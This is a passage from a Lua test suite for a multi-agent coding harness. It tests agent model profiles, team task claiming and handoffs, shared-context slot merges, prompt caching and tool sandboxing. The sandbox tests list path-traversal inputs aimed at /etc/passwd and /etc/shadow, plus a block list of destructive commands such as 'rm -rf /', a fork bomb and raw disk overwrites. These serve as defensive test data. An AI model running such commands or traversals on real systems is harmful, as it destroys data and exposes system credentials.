  local kernel = WheelKernel.new_mock()

  -- Default agent without explicit panel options
  local agent_default = WheelAgent.new({
    name = "worker-default-01",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
  })
  assert(agent_default.headless == true, "agent must default to headless = true")
  assert(agent_default.panel_id == "headless:panel:worker-default-01", "default panel_id format")

  -- Agent status method
  local st = agent_default:status()
  assert(st.name == "worker-default-01")
  assert(st.role == WheelAgent.Role.CODING)
  assert(st.headless == true)
  assert(st.panel_id == "headless:panel:worker-default-01")

  -- Agent configured via hermetic WheelConfig (isolated from host/repo environment)
  local empty_tmp_dir = "/tmp/bitty/test_wheel_empty_cfg"
  os.execute("rm -rf " .. empty_tmp_dir .. " && mkdir -p " .. empty_tmp_dir)
  local cfg = WheelConfig.load({
    project_root = empty_tmp_dir,
    global_path = empty_tmp_dir .. "/nonexistent_global.lua",
    trust_mode = "permissive",
  }).config
  os.execute("rm -rf " .. empty_tmp_dir)

  local agent_configured = WheelAgent.new({
    name = "worker-configured-01",
    role = WheelAgent.Role.DEBUG,
    kernel = kernel,
    config = cfg,
  })
  assert(agent_configured.headless == true)
  assert(agent_configured.model.temperature == 0.1, "should inherit temperature 0.1 for debug role")
  assert(agent_configured.budget.max_iterations == 15, "should inherit budget 15 for debug role")

  -- Telemetry in execute_task
  kernel:create_task({ id = "T-CONTAINER", title = "Container task" })
  local outcome = agent_configured:execute_task("T-CONTAINER", function()
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.panel_id == "headless:panel:worker-configured-01")
  assert(outcome.headless == true)
end)

run_test("WheelConfig: skill capability discovery with filtering", function()
  local tmp_dir = "/tmp/bitty/test_wheel_skills"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. tmp_dir .. "/.agents/skills/skill-alpha " .. tmp_dir .. "/.agents/skills/skill-beta " .. tmp_dir .. "/.agents/skills/skill-gamma")

  local f1 = io.open(tmp_dir .. "/.agents/skills/skill-alpha/SKILL.md", "w")
  f1:write("# Alpha Skill\n")
  f1:close()
  local f2 = io.open(tmp_dir .. "/.agents/skills/skill-beta/SKILL.md", "w")
  f2:write("# Beta Skill\n")
  f2:close()
  local f3 = io.open(tmp_dir .. "/.agents/skills/skill-gamma/SKILL.md", "w")
  f3:write("# Gamma Skill\n")
  f3:close()

  -- Filter: disable beta
  local filter_res = WheelConfig.discover_agent_capabilities(tmp_dir, {
    disabled = { "skill-beta" },
  })
  assert(filter_res.count == 2, "expected 2 skills discovered")
  local names = {}
  for _, s in ipairs(filter_res.skills) do
    names[s.name] = true
  end
  assert(names["skill-alpha"] == true)
  assert(names["skill-gamma"] == true)
  assert(names["skill-beta"] == nil, "skill-beta must be filtered out")

  os.execute("rm -rf " .. tmp_dir)
end)

--------------------------------------------------------------------------------
-- Section 9: Multi-Agent Workspace Collaboration & Model Profiles
--------------------------------------------------------------------------------

local WheelTeam = require("wheel.team")

run_test("WheelAgent: heterogeneous model profiles and validation", function()
  -- Default model profiles per role
  local prof_cmd = WheelAgent.get_default_model_profile(WheelAgent.Role.COMMANDER)
  assert(prof_cmd.provider == "anthropic", "commander default provider")
  assert(prof_cmd.model == "claude-3-5-sonnet", "commander default model")
  assert(prof_cmd.thinking.enabled == true, "commander thinking enabled")
  assert(prof_cmd.thinking.gear == "medium", "commander thinking gear")

  local prof_dbg = WheelAgent.get_default_model_profile(WheelAgent.Role.DEBUG)
  assert(prof_dbg.provider == "deepseek", "debug default provider")
  assert(prof_dbg.model == "deepseek-reasoner", "debug default model")
  assert(prof_dbg.thinking.enabled == true, "debug thinking enabled")
  assert(prof_dbg.thinking.budget_tokens == 8192, "debug thinking budget")

  local prof_rev = WheelAgent.get_default_model_profile(WheelAgent.Role.REVIEWER)
  assert(prof_rev.provider == "openai", "reviewer default provider")
  assert(prof_rev.model == "gpt-4o", "reviewer default model")
  assert(prof_rev.temperature == 0.0, "reviewer temperature strict 0")

  -- Validation
  local valid, err = WheelAgent.validate_model_profile({
    provider = "anthropic",
    model = "claude-3-7-sonnet",
    temperature = 0.3,
    thinking = { enabled = true, budget_tokens = 4096, gear = "high" },
    context_budget = { max_tokens = 128000 },
    retry = { max_retries = 3, backoff_ms = 500 },
  })
  assert(valid == true, "valid profile must pass validation: " .. tostring(err))

  local invalid, err2 = WheelAgent.validate_model_profile({
    provider = "", -- empty provider
    model = "test",
  })
  assert(invalid == false, "invalid provider must fail validation")
  assert(err2 ~= nil, "error reason returned")

  -- Agent model profile resolution and telemetry
  local kernel = WheelKernel.new({ in_memory = true })
  local custom_agent = WheelAgent.new({
    name = "debugger-01",
    role = WheelAgent.Role.DEBUG,
    kernel = kernel,
    model_profile = {
      provider = "deepseek",
      model = "deepseek-r1-custom",
      temperature = 0.0,
      thinking = { enabled = true, budget_tokens = 16384 },
    },
  })

  local p = custom_agent:get_model_profile()
  assert(p.provider == "deepseek")
  assert(p.model == "deepseek-r1-custom")
  assert(p.thinking.budget_tokens == 16384)

  kernel:create_task({ id = "T-PROF", title = "Profile task" })
  local outcome = custom_agent:execute_task("T-PROF", function()
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.model_profile ~= nil, "telemetry includes model_profile")
  assert(outcome.model_profile.model == "deepseek-r1-custom")
  assert(outcome.model_profile.provider == "deepseek")
end)

run_test("WheelTeam: workspace colleague registration and roster", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({
    kernel = kernel,
    workspace_root = "/tmp/bitty/test_workspace",
  })

  assert(team ~= nil)
  assert(#team:list_agents() == 0, "initial team is empty")

  -- Spawn peer colleagues
  local cmd = team:spawn_agent({
    name = "architect",
    role = WheelAgent.Role.COMMANDER,
  })
  local coder = team:spawn_agent({
    name = "backend-dev",
    role = WheelAgent.Role.CODING,
  })
  local rev = team:spawn_agent({
    name = "qa-auditor",
    role = WheelAgent.Role.REVIEWER,
  })

  assert(team:get_agent("architect") == cmd)
  assert(team:get_agent("backend-dev") == coder)
  assert(team:get_agent("qa-auditor") == rev)
  assert(#team:list_agents() == 3, "team roster has 3 colleagues")

  -- Peer colleagues start in idle state
  local st_coder = team:get_agent_state("backend-dev")
  assert(st_coder.state == "idle")
  assert(st_coder.active_task_id == nil)
  assert(st_coder.tasks_completed == 0)

  -- Duplicate agent name rejected
  local ok_dup, err_dup = pcall(function()
    team:spawn_agent({ name = "backend-dev", role = WheelAgent.Role.CODING })
  end)
  assert(ok_dup == false, "duplicate agent name must fail")
end)

run_test("WheelTeam: atomic task claim and collision prevention", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "dev-1", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "dev-2", role = WheelAgent.Role.CODING })

  kernel:create_task({ id = "TASK-CLAIM-01", title = "First task", priority = 10 })

  -- dev-1 claims TASK-CLAIM-01
  local ok_c1, err_c1 = team:claim_task("dev-1", "TASK-CLAIM-01")
  assert(ok_c1 == true, "first claim should succeed: " .. tostring(err_c1))

  local st_dev1 = team:get_agent_state("dev-1")
  assert(st_dev1.state == "busy")
  assert(st_dev1.active_task_id == "TASK-CLAIM-01")

  -- dev-2 attempts to claim the same task -> must fail closed
  local ok_c2, err_c2 = team:claim_task("dev-2", "TASK-CLAIM-01")
  assert(ok_c2 == false, "second claim on same task must fail")
  assert(string.find(tostring(err_c2), "already claimed") ~= nil, "error explains task is already claimed")

  -- dev-1 attempts to claim another task while busy -> must fail
  kernel:create_task({ id = "TASK-CLAIM-02", title = "Second task", priority = 5 })
  local ok_busy, err_busy = team:claim_task("dev-1", "TASK-CLAIM-02")
  assert(ok_busy == false, "busy agent cannot claim another task")
  assert(string.find(tostring(err_busy), "not idle") ~= nil, "error explains agent is busy")
end)

run_test("WheelTeam: task completion and release", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  local worker = team:spawn_agent({ name = "worker-01", role = WheelAgent.Role.CODING })
  kernel:create_task({ id = "TASK-REL-01", title = "Task to release" })

  team:claim_task("worker-01", "TASK-REL-01")
  assert(team:get_agent_state("worker-01").state == "busy")

  -- Release task with success
  local ok_rel, err_rel = team:release_task("worker-01", "TASK-REL-01", {
    status = "succeeded",
    checkpoint_hash = "cp-12345",
  })
  assert(ok_rel == true, "release should succeed: " .. tostring(err_rel))

  local st_after = team:get_agent_state("worker-01")
  assert(st_after.state == "idle", "worker returns to idle")
  assert(st_after.active_task_id == nil)
  assert(st_after.tasks_completed == 1, "completed task count incremented")

  -- Kernel task is now succeeded
  local t = kernel:get_task("TASK-REL-01")
  assert(t.status == "succeeded" or t.status == "Succeeded")
end)

run_test("WheelTeam: structured handoff from worker to reviewer", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "coder-bob", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "reviewer-alice", role = WheelAgent.Role.REVIEWER })

  kernel:create_task({ id = "TASK-HANDOFF-01", title = "Implement feature" })
  team:claim_task("coder-bob", "TASK-HANDOFF-01")

  -- Coder finishes implementation and hands off to Reviewer
  local ok_ho, ho_record = team:handoff("coder-bob", "reviewer-alice", "TASK-HANDOFF-01", {
    reason = "implementation_complete",
    rationale = "Code written and local unit tests green. Requesting security & style audit.",
    checkpoint_hash = "6a09e667bb67ae853c6ef372a54ff53a",
  })

  assert(ok_ho == true, "handoff should succeed")
  assert(ho_record ~= nil)
  assert(ho_record.from_agent == "coder-bob")
  assert(ho_record.to_agent == "reviewer-alice")
  assert(ho_record.task_id == "TASK-HANDOFF-01")
  assert(ho_record.checkpoint_hash == "6a09e667bb67ae853c6ef372a54ff53a")
  assert(ho_record.timestamp ~= nil)

  -- Coder is now idle, Reviewer is now busy with the task
  assert(team:get_agent_state("coder-bob").state == "idle")
  assert(team:get_agent_state("coder-bob").active_task_id == nil)

  local rev_st = team:get_agent_state("reviewer-alice")
  assert(rev_st.state == "busy")
  assert(rev_st.active_task_id == "TASK-HANDOFF-01")

  -- Reviewer audits and finishes
  team:release_task("reviewer-alice", "TASK-HANDOFF-01", { status = "succeeded" })
  assert(team:get_agent_state("reviewer-alice").state == "idle")
  assert(#team.handoffs == 1, "recorded 1 handoff")
end)

run_test("WheelTeam: wave dispatching across DAG dependencies", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "c-1", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "c-2", role = WheelAgent.Role.CODING })

  -- Two independent ready tasks and one dependent task
  kernel:create_task({ id = "T-A", title = "Task A", priority = 10 })
  kernel:create_task({ id = "T-B", title = "Task B", priority = 8 })
  kernel:create_task({ id = "T-C", title = "Task C", priority = 5, dependencies = { "T-A", "T-B" } })

  -- Wave 1: T-A and T-B are ready -> dispatch to c-1 and c-2
  local dispatched = team:dispatch_wave()
  assert(#dispatched == 2, "expected 2 tasks dispatched in wave 1")

  local task_map = {}
  for _, d in ipairs(dispatched) do
    task_map[d.task_id] = d.agent_name
  end
  assert(task_map["T-A"] ~= nil)
  assert(task_map["T-B"] ~= nil)
  assert(task_map["T-C"] == nil, "T-C has pending dependencies, must not be dispatched")

  -- Complete T-A and T-B
  team:release_task(task_map["T-A"], "T-A", { status = "succeeded" })
  team:release_task(task_map["T-B"], "T-B", { status = "succeeded" })

  -- Wave 2: T-C is now ready -> dispatch to now-idle agent
  local dispatched_w2 = team:dispatch_wave()
  assert(#dispatched_w2 == 1, "expected 1 task dispatched in wave 2")
  assert(dispatched_w2[1].task_id == "T-C")

  team:release_task(dispatched_w2[1].agent_name, "T-C", { status = "succeeded" })
  assert(#team:dispatch_wave() == 0, "no more tasks to dispatch")
end)

run_test("WheelTeam: organizational status telemetry", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "lead", role = WheelAgent.Role.COMMANDER })
  team:spawn_agent({ name = "worker-a", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "worker-b", role = WheelAgent.Role.DEBUG })

  kernel:create_task({ id = "T-ST", title = "Status test task" })
  team:claim_task("worker-a", "T-ST")

  local st = team:status()
  assert(st.total_agents == 3)
  assert(st.idle_count == 2)
  assert(st.busy_count == 1)
  assert(#st.agents == 3)

  local worker_entry = nil
  for _, a in ipairs(st.agents) do
    if a.name == "worker-a" then worker_entry = a end
  end
  assert(worker_entry ~= nil)
  assert(worker_entry.state == "busy")
  assert(worker_entry.active_task_id == "T-ST")
  assert(worker_entry.model ~= nil)
  assert(worker_entry.panel_id == "headless:panel:worker-a")
  assert(worker_entry.headless == true)
end)

-- ===========================================================================
-- 10. WheelContext Tests (Shared Context, Slots, CAS, 3-Way Merge, Prefix Cache)
-- ===========================================================================

local WheelContext = require("wheel.context")

run_test("WheelContext: CAS slot operations and version conflict detection", function()
  local ctx = WheelContext.new()

  -- Put new slot
  local put_res, err = ctx:put_slot("workspace/overview", "# Project Overview\nPure Lua Wheel Agent Harness")
  assert(put_res ~= nil and put_res.success == true, "put_slot should succeed")
  assert(put_res.version == 1, "initial version should be 1")
  assert(put_res.kind == "workspace", "slot kind classified as workspace")

  -- Read slot back
  local get_res = ctx:get_slot("workspace/overview")
  assert(get_res.found == true)
  assert(get_res.version == 1)
  assert(string.find(get_res.content, "Project Overview") ~= nil)

  -- Update with matching expected_version (CAS success)
  local put_res2, err2 = ctx:put_slot("workspace/overview", "# Project Overview\nUpdated content", 1)
  assert(put_res2 ~= nil and put_res2.success == true)
  assert(put_res2.version == 2)

  -- Update with mismatched expected_version (CAS failure)
  local put_res3, err3 = ctx:put_slot("workspace/overview", "Conflicting overwrite", 1)
  assert(put_res3 == nil, "CAS mismatch must reject write")
  assert(err3 ~= nil and err3.error == "cas_conflict", "error kind must be cas_conflict")
  assert(err3.expected_version == 1)
  assert(err3.current_version == 2)

  -- Remove slot with matching version
  local rem_res, rem_err = ctx:remove_slot("workspace/overview", 2)
  assert(rem_res ~= nil and rem_res.removed == true)
  assert(ctx:get_slot("workspace/overview").found == false)

  -- Remove nonexistent slot
  local rem_non = ctx:remove_slot("nonexistent/slot")
  assert(rem_non.removed == false)
end)

run_test("WheelContext: canonical Merkle tree hashing and slot listing", function()
  local ctx = WheelContext.new()
  ctx:put_slot("tasks/CTX-001/spec", "Spec 1")
  ctx:put_slot("tasks/CTX-002/spec", "Spec 2")
  ctx:put_slot("decisions/ADR-001", "Architecture Decision 1")
  ctx:put_slot("workspace/rules", "Directives")

  -- Prefix listing
  local task_slots = ctx:list_slots("tasks/")
  assert(#task_slots == 2, "expected 2 task slots")
  assert(task_slots[1].name == "tasks/CTX-001/spec")
  assert(task_slots[2].name == "tasks/CTX-002/spec")

  -- Full canonical sorted list
  local all_slots = ctx:list_slots()
  assert(#all_slots == 4)
  assert(all_slots[1].name == "decisions/ADR-001")
  assert(all_slots[4].name == "workspace/rules")

  -- Merkle tree hash
  local th1 = ctx:tree_hash()
  assert(type(th1) == "string" and #th1 == 64, "tree hash should be 64-hex string")
  -- Deterministic
  assert(ctx:tree_hash() == th1)

  -- Modifying a slot changes tree hash
  ctx:put_slot("decisions/ADR-001", "Updated ADR")
  local th2 = ctx:tree_hash()
  assert(th2 ~= th1, "modifying slot must invalidate tree hash")
end)

run_test("WheelContext: semantic 3-way slot merge", function()
  local base_tree = {
    ["workspace/overview"] = { content = "Original Overview", hash = WheelContext.compute_hash("Original Overview") },
    ["tasks/T-1/spec"] = { content = "Original Spec", hash = WheelContext.compute_hash("Original Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
  }

  local our_tree = {
    ["workspace/overview"] = { content = "Our Modified Overview", hash = WheelContext.compute_hash("Our Modified Overview") },
    ["tasks/T-1/spec"] = { content = "Original Spec", hash = WheelContext.compute_hash("Original Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
    ["tasks/T-2/spec"] = { content = "Our New Task 2", hash = WheelContext.compute_hash("Our New Task 2") },
  }

  local their_tree = {
    ["workspace/overview"] = { content = "Original Overview", hash = WheelContext.compute_hash("Original Overview") },
    ["tasks/T-1/spec"] = { content = "Their Modified Spec", hash = WheelContext.compute_hash("Their Modified Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
    ["tasks/T-3/spec"] = { content = "Their New Task 3", hash = WheelContext.compute_hash("Their New Task 3") },
  }

  -- Merge without conflicts
  local merge_res = WheelContext.merge_3way(base_tree, our_tree, their_tree)
  assert(merge_res.conflict_count == 0, "expected 0 conflicts")
  assert(merge_res.merged["workspace/overview"].content == "Our Modified Overview", "unconflicted edit from us preserved")
  assert(merge_res.merged["tasks/T-1/spec"].content == "Their Modified Spec", "unconflicted edit from them preserved")
  assert(merge_res.merged["tasks/T-2/spec"].content == "Our New Task 2", "our addition preserved")
  assert(merge_res.merged["tasks/T-3/spec"].content == "Their New Task 3", "their addition preserved")
  assert(merge_res.merged["decisions/ADR-1"].content == "Shared Decision", "unchanged entry preserved")

  -- Now induce concurrent conflicting edits on decisions/ADR-1
  our_tree["decisions/ADR-1"] = { content = "Our ADR amendment", hash = WheelContext.compute_hash("Our ADR amendment") }
  their_tree["decisions/ADR-1"] = { content = "Their conflicting ADR amendment", hash = WheelContext.compute_hash("Their conflicting ADR amendment") }

  local conflict_merge = WheelContext.merge_3way(base_tree, our_tree, their_tree)
  assert(conflict_merge.conflict_count == 1, "expected 1 structured conflict")
  local c = conflict_merge.conflicts[1]
  assert(c.slot == "decisions/ADR-1")
  assert(c.base_content == "Shared Decision")
  assert(c.our_content == "Our ADR amendment")
  assert(c.their_content == "Their conflicting ADR amendment")
  assert(conflict_merge.merged["decisions/ADR-1"].conflict == true)
end)

run_test("WheelContext.ContextBus: in-memory pubsub event dispatch and agent notification", function()
  local bus = WheelContext.ContextBus.new()
  local received_events = {}

  bus:subscribe("agent-reviewer", function(event)
    table.insert(received_events, event)
  end)

  assert(bus:is_subscribed("agent-reviewer") == true)
  assert(bus:is_subscribed("unknown-agent") == false)

  -- Publish event
  local notified = bus:publish({ type = "slot_updated", name = "tasks/CTX-001/artifacts", hash = "abc123" })
  assert(notified == 1, "1 subscriber notified")
  assert(#received_events == 1)
  assert(received_events[1].type == "slot_updated")
  assert(received_events[1].name == "tasks/CTX-001/artifacts")
  assert(received_events[1].timestamp_ms ~= nil)

  -- Unsubscribe
  bus:unsubscribe("agent-reviewer")
  assert(bus:is_subscribed("agent-reviewer") == false)
  local notified2 = bus:publish({ type = "test_event" })
  assert(notified2 == 0, "0 subscribers notified after unsubscribe")
  assert(#received_events == 1)
end)

run_test("WheelContext: prefix-cache-friendly Three-Zone prompt compilation and key stability", function()
  local ctx = WheelContext.new()
  ctx:put_slot("workspace/overview", "Wheel Agent Framework")
  ctx:put_slot("decisions/ADR-001", "Pure Lua 5.1 compatibility")

  local prompt_opts = {
    system_instruction = "You are Bittie, an elite coding agent.",
    project_rules = { "Rule B: Zero unwrap", "Rule A: English only" },
    tool_schemas = { "run_command", "view_file", "write_file" },
    active_task = { id = "CTX-500", title = "Implement context cache", status = "running", priority = 1 },
    recent_actions = {
      { action_id = "act-1", tool = "run_command", exit_code = 0, duration_ms = 45, raw_stdout = "All tests passed" },
      { action_id = "act-2", tool = "write_file", exit_code = 0, duration_ms = 12, raw_stdout = "Created context.lua" },
    },
    turn_prompt = "Verify prompt cache stability across multiple invocations.",
  }

  local res1, err1 = ctx:compile_prompt(prompt_opts)
  assert(res1 ~= nil and res1.success == true, "compile_prompt should succeed")
  assert(res1.prefix_cache_key ~= nil and #res1.prefix_cache_key == 64)
  assert(res1.cache_share_ratio > 0.0)

  -- Verify Zone 1 canonical sorting: Rule A precedes Rule B regardless of input order
  local prompt_opts_shuffled = {
    system_instruction = "You are Bittie, an elite coding agent.",
    project_rules = { "Rule A: English only", "Rule B: Zero unwrap" }, -- different order
    tool_schemas = { "write_file", "run_command", "view_file" }, -- different order
    active_task = { id = "CTX-500", title = "Implement context cache", status = "running", priority = 1 },
    recent_actions = prompt_opts.recent_actions,
    turn_prompt = "Different turn prompt should not change Zone 1 prefix hash!",
  }

  local res2, err2 = ctx:compile_prompt(prompt_opts_shuffled)
  assert(res2 ~= nil and res2.success == true)
  -- The prefix_cache_key MUST be byte-identical, achieving 100% prefix cache reuse!
  assert(res2.prefix_cache_key == res1.prefix_cache_key, "Zone 1 prefix_cache_key must be byte-stable across orderings and turns")
  assert(res2.zone1_prefix == res1.zone1_prefix, "Zone 1 prefix string must match exactly")
end)

run_test("WheelContext: multi-tier budget reduction pipeline", function()
  -- Config with small budgets to trigger reduction tiers
  local ctx = WheelContext.new({
    max_budget_bytes = 1000,
    zone1_max_bytes = 400,
    zone2_max_bytes = 400,
    zone3_max_bytes = 300,
  })

  -- Zone 1 fail-closed on budget violation
  local huge_sys = string.rep("X", 500)
  local fail_res, fail_err = ctx:compile_prompt({ system_instruction = huge_sys })
  assert(fail_res == nil, "Zone 1 over budget must fail closed")
  assert(fail_err ~= nil and fail_err.error == "zone1_budget_exceeded")

  -- Populate slots with unpinned scratchpad
  ctx:put_slot("decisions/ADR-001", "Core Decision")
  ctx:put_slot("scratch/worker/temp_notes", string.rep("Scratchpad note ", 20)) -- candidate for Tier 1 pruning

  local prompt_opts = {
    system_instruction = "Concise instruction.",
    turn_prompt = "Step instruction.",
  }

  local compiled = ctx:compile_prompt(prompt_opts)
  assert(compiled ~= nil and compiled.success == true)
  -- If budget pressure triggered, scratchpad is pruned
  if compiled.tiers_applied.tier1_pruned_scratch then
    assert(string.find(compiled.prompt_string, "Scratchpad note") == nil, "Tier 1 must prune scratchpad")
  end
end)

run_test("WheelTeam & WheelAgent: shared context mounting, task claim, and handoff propagation", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  -- Spawn coding worker and reviewer
  local worker = team:spawn_agent({ name = "dev-1", role = WheelAgent.Role.CODING })
  local reviewer = team:spawn_agent({ name = "auditor-1", role = WheelAgent.Role.REVIEWER })

  assert(worker.context == team.context, "worker shares team context")
  assert(reviewer.context == team.context, "reviewer shares team context")

  -- Create and claim task
  kernel:create_task({ id = "CTX-777", title = "Multi-agent context sync" })
  local ok_claim = team:claim_task("dev-1", "CTX-777")
  assert(ok_claim == true)

  -- Verify active worker slot was written
  local worker_slot = team.context:get_slot("tasks/CTX-777/worker")
  assert(worker_slot.found == true)
  assert(worker_slot.content == "dev-1")

  -- Worker executes task and updates context slot
  worker:put_slot("tasks/CTX-777/artifacts", "commit-hash: abc999, diff: +120 -10")
  assert(team.context:get_slot("tasks/CTX-777/artifacts").found == true)

  -- Worker hands off to Reviewer
  local ok_handoff, handoff_rec = team:handoff("dev-1", "auditor-1", "CTX-777", {
    reason = "Ready for audit",
    rationale = "Implemented shared context and prefix cache; 100% tests pass.",
    checkpoint_hash = "cp-777",
  })
  assert(ok_handoff == true)

  -- Verify handoff slot recorded in shared context
  local handoff_slot = team.context:get_slot("tasks/CTX-777/handoff")
  assert(handoff_slot.found == true)
  assert(string.find(handoff_slot.content, "auditor-1", 1, true) ~= nil)
  assert(string.find(handoff_slot.content, "cp-777", 1, true) ~= nil)

  -- Reviewer immediately inspects artifacts without re-reading files
  local reviewer_view = reviewer:get_slot("tasks/CTX-777/artifacts")
  assert(reviewer_view.found == true)
  assert(string.find(reviewer_view.content, "abc999", 1, true) ~= nil)

  -- Team status reports context telemetry
  local st = team:status()
  assert(st.context ~= nil)
  assert(st.context.total_slots >= 2)
  assert(type(st.context.tree_hash) == "string")
end)

-- ===========================================================================
-- 11. WheelTool: Sandboxing, Path Traversal & Dangerous Command Guards
-- ===========================================================================

run_test("WheelTool: ActionIntent enum and schema validation", function()
  assert(WheelTool.ActionIntent.INSPECT == "inspect")
  assert(WheelTool.ActionIntent.MODIFY == "modify")
  assert(WheelTool.ActionIntent.EXECUTE == "execute")
  assert(WheelTool.ActionIntent.VERIFY == "verify")
  assert(WheelTool.ActionIntent.CUSTOM == "custom")

  local reg = WheelTool.get_default_registry()
  assert(reg ~= nil)
  local tools = reg:list_tools()
  assert(#tools >= 7, "at least 7 core tools registered")

  local tool_names = {}
  for _, t in ipairs(tools) do
    tool_names[t.name] = t.intent
  end
  assert(tool_names["read_file"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["write_file"] == WheelTool.ActionIntent.MODIFY)
  assert(tool_names["edit_file"] == WheelTool.ActionIntent.MODIFY)
  assert(tool_names["run_command"] == WheelTool.ActionIntent.EXECUTE)
  assert(tool_names["list_directory"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["search_code"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["read_blob"] == WheelTool.ActionIntent.INSPECT)
end)

run_test("WheelTool: Path sandboxing and directory traversal rejection", function()
  local root = "/tmp/bitty/test_tool_sandbox"

  -- Safe relative paths resolve within root
  local p1, err1 = WheelTool.sanitize_path("foo/bar.txt", root)
  assert(p1 == root .. "/foo/bar.txt", "relative path inside root: " .. tostring(err1))

  -- Inner . and .. that stay inside root resolve cleanly
  local p2, err2 = WheelTool.sanitize_path("foo/./baz/../bar.txt", root)
  assert(p2 == root .. "/foo/bar.txt", "inner .. inside root: " .. tostring(err2))

  -- Path traversal attempts escaping root fail closed
  local p3, err3 = WheelTool.sanitize_path("../../etc/passwd", root)
  assert(p3 == nil, "path traversal must return nil")
  assert(string.find(err3, "path_traversal_denied", 1, true) ~= nil, "error message specifies path_traversal_denied")

  local p4, err4 = WheelTool.sanitize_path("foo/../../../etc/shadow", root)
  assert(p4 == nil, "excessive .. traversal must fail closed")
  assert(string.find(err4, "path_traversal_denied", 1, true) ~= nil)

  -- Absolute path not starting with root fails closed
  local p5, err5 = WheelTool.sanitize_path("/etc/passwd", root)
  assert(p5 == nil, "external absolute path must fail closed")
  assert(string.find(err5, "path_traversal_denied", 1, true) ~= nil)
end)

run_test("WheelTool: Catastrophic dangerous command detection", function()
  -- Dangerous commands must be blocked
  local bad_commands = {
    "rm -rf /",
    "rm -rf /*",
    "rm -rf /etc",
    "rm -rf ~",
    "rm -rf ../",
    "mkfs.ext4 /dev/nvme0n1",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    ":(){ :|:& };:",
    "chmod -R 777 /",
    "shutdown -h now",
    "reboot",
  }

  for _, cmd in ipairs(bad_commands) do
    local is_bad, reason = WheelTool.check_dangerous_command(cmd)
    assert(is_bad == true, "command must be blocked: " .. cmd)
    assert(string.find(reason, "dangerous_command_blocked", 1, true) ~= nil)
  end

  -- Safe commands must be allowed
  local safe_commands = {
    "cargo test --workspace",
    "git status",
    "ls -la src/",
    "echo 'hello world'",
    "bun run prettier --check .",
  }

  for _, cmd in ipairs(safe_commands) do
    local is_bad, _ = WheelTool.check_dangerous_command(cmd)
    assert(is_bad == false, "safe command should not be blocked: " .. cmd)
  end
end)

-- ===========================================================================
-- 12. WheelTool: Core Engineering Tools Execution
-- ===========================================================================

run_test("WheelTool: Core file tools (read_file, write_file, edit_file)", function()
  local root = "/tmp/bitty/test_tool_sandbox"
  os.execute("mkdir -p " .. root)
  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }

  -- 1. write_file: create a sample text file
  local sample_text = "Line 1: Alpha\nLine 2: Beta\nLine 3: Gamma\nLine 4: Delta\nLine 5: Epsilon\n"
  local w_res = reg:dispatch("write_file", { path = "nested/sample.txt", content = sample_text, overwrite = true }, env)
  assert(w_res.success == true, "write_file should succeed: " .. tostring(w_res.stderr))
  assert(w_res.exit_code == 0)

  -- 2. write_file without overwrite fails if file exists
  local w_no_ov = reg:dispatch("write_file", { path = "nested/sample.txt", content = "new text", overwrite = false }, env)
  assert(w_no_ov.success == false, "write_file without overwrite must fail")
  assert(string.find(w_no_ov.stderr, "already exists", 1, true) ~= nil)

  -- 3. read_file: full read
  local r_full = reg:dispatch("read_file", { path = "nested/sample.txt" }, env)
  assert(r_full.success == true)
  assert(string.find(r_full.stdout, "Line 1: Alpha", 1, true) ~= nil)
  assert(string.find(r_full.stdout, "Line 5: Epsilon", 1, true) ~= nil)

  -- 4. read_file: bounded line slicing (lines 2 to 4)
  local r_slice = reg:dispatch("read_file", { path = "nested/sample.txt", start_line = 2, end_line = 4 }, env)
  assert(r_slice.success == true)
  assert(string.find(r_slice.stdout, "Line 1: Alpha", 1, true) == nil)
  assert(string.find(r_slice.stdout, "Line 2: Beta", 1, true) ~= nil)
  assert(string.find(r_slice.stdout, "Line 4: Delta", 1, true) ~= nil)
  assert(string.find(r_slice.stdout, "Line 5: Epsilon", 1, true) == nil)

  -- 5. edit_file: exact target replacement
  local e_res = reg:dispatch("edit_file", {
    path = "nested/sample.txt",
    target = "Line 3: Gamma",
    replacement = "Line 3: Gamma (MODIFIED)",
  }, env)
  assert(e_res.success == true, "edit_file should succeed: " .. tostring(e_res.stderr))

  -- Verify replacement persisted
  local r_check = reg:dispatch("read_file", { path = "nested/sample.txt" }, env)
  assert(string.find(r_check.stdout, "Line 3: Gamma (MODIFIED)", 1, true) ~= nil)

  -- 6. edit_file: non-existent target fails cleanly
  local e_fail = reg:dispatch("edit_file", {
    path = "nested/sample.txt",
    target = "Non-existent string 12345",
    replacement = "Replacement",
  }, env)
  assert(e_fail.success == false)
  assert(string.find(e_fail.stderr, "not found", 1, true) ~= nil)

  -- Cleanup
  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 13. WheelTool: Role Authority Gating & Intent Enforcement
-- ===========================================================================

run_test("WheelTool: Role authority gating and intent enforcement", function()
  local reg = WheelTool.get_default_registry()
